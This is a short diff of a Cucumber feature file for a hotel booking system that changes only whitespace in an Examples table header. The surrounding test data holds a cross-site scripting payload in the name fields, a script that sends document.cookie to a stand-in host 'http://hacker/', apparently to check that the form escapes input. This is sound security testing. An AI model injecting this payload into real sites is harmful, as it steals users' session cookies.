@@ -114,5 +114,5 @@ Feature : Hotel Booking System
     And success message is displayed
     And saved booking should be displayed : <first_name>, <sure_name>, <price>, <deposit>, <checkin_date>, <checkout_date>
     Examples:
-      | first_name                                                                              | sure_name                                                                              | price |deposit | checkin_date  | checkout_date   |
+      | first_name                                                                             | sure_name                                                                              | price |deposit | checkin_date  | checkout_date   |
       | <SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>   | <SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>   | 500   | true   |  2018-06-20   |   2018-06-20    |
